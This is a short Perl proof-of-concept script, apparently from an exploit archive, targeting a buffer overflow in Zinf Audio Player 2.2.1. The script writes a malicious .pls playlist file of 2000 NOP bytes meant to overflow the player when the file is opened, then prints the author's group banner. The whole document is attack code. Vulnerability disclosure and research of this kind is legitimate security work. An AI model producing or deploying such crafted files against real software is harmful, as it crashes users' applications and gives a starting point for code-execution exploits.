#!/usr/bin/perl
# Discovered & Written by : Hakxer
# Home : www.sec-geeks.com
# Program : http://www.zinf.org/ ../http://prdownloads.sourceforge.net/zinf/zinf-setup-2.2.1.exe
# Zinf Audio Player 2.2.1 (PLS FILE)  Buffer Overflow PoC

my $chars="\x90" x 2000;

open(MYFILE,'>>hakxer.pls');

print MYFILE $chars;

close(MYFILE);

print " PoC Created .. Hakxer [ Sec-Geeks.com ] EgY Coders Team";

